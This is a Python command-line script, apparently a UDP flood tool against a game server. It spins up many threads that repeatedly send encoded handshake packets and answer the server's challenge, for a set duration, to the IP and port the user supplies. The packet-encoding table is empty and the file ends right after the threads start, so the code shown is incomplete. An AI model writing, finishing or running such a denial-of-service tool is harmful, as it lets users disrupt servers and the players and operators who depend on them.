import time
import socket
import threading
import sys

encryption_table = [
    
]

def kyretardizeDatagram(buffer, length, port, unk):
    checksum = 0
    for i in range(length):
        checksum ^= buffer[i] & 0xAA
    
    checksum = bytearray([checksum])

    for i in range(length):
        buffer[i] = encryption_table[ buffer[i] ]
        if unk:
            buffer[i] ^= (port ^ 0xCC) & 0xFF
        
        unk ^= 1

    return checksum + buffer

def send_cookie(ip_addr, port, stop_event):
    while not stop_event.is_set():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)    
        sock.settimeout(1)

        buffer = bytearray([24, 0, 0])
        buffer = kyretardizeDatagram(buffer, 3, port, 0)

        try:
            sock.sendto(buffer, (ip_addr, port))
            data, _ = sock.recvfrom(32)
            if data[0] == 26:
                buffer = bytearray([24, 0, 0])
                
                buffer[1:3] = (int.from_bytes(data[1:3], byteorder = 'little') ^ 0x6969).to_bytes(2, byteorder = 'little')
                buffer = kyretardizeDatagram(buffer, 3, port, 0)

                sock.sendto(buffer, (ip_addr, port))
            
            else:
                break
        
        except:
            pass

        sock.close()
        time.sleep(0.5)  # Reducido para mayor velocidad

def parse_args():
    ip = None
    port = None
    duration = None
    connections = 5  # valor por defecto
    
    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == '-c' and i + 1 < len(sys.argv):
            connections = int(sys.argv[i + 1])
            i += 2
        elif ip is None:
            ip = sys.argv[i]
            i += 1
        elif port is None:
            port = int(sys.argv[i])
            i += 1
        elif duration is None:
            duration = int(sys.argv[i])
            i += 1
        else:
            i += 1
    
    return ip, port, duration, connections

if __name__ == "__main__":
    ip, port, duration, connections = parse_args()
    
    if not ip or not port or not duration:
        print("Uso: python script.py <IP> <PUERTO> <TIEMPO> [-c <conexiones>]")
        print("Ejemplo: python script.py 127.0.0.1 7777 60 -c 50")
        print("Por defecto: 5 conexiones")
        sys.exit(1)
    
    print(f'Destination: {ip}:{port}')
    print(f'Time: {duration} seconds')
    print(f'Connections: {connections}')
    print()

    stop_event = threading.Event()
    threads = []

    for x in range(connections):
        t = threading.Thread(target = send_cookie, daemon = True, args = (ip, port, stop_event))
        threads.append(t)
        t.start()

   
